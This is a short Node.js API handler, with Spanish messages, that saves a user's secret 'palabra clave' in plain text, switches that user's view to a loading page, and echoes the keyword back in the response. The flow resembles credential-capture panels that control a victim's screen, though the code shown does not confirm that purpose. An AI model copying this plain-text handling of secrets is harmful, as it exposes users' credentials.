const { sql, initDb } = require('../../lib/db');

module.exports = async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método no permitido' });
  }

  const { id } = req.query;
  const { keyword_code } = req.body;

  if (!id || !keyword_code) {
    return res.status(400).json({ error: 'Falta el id del usuario o la palabra clave' });
  }

  const keywordCode = String(keyword_code).trim();
  if (keywordCode.length < 4) {
    return res.status(400).json({ error: 'La palabra clave debe tener mínimo 4 caracteres' });
  }

  try {
    await initDb();

    const result = await sql`
      UPDATE users SET keyword_code = ${keywordCode}, current_view = 'cargando.html'
      WHERE id = ${id}
      RETURNING id
    `;

    if (result.length === 0) {
      return res.status(404).json({ error: 'Usuario no encontrado' });
    }

    return res.status(200).json({
      message: 'Palabra clave guardada correctamente',
      userId: id,
      keyword_code: keywordCode,
      view: 'cargando.html',
    });
  } catch (error) {
    console.error('Keyword error:', error);
    return res.status(500).json({ error: 'Error interno del servidor' });
  }
};
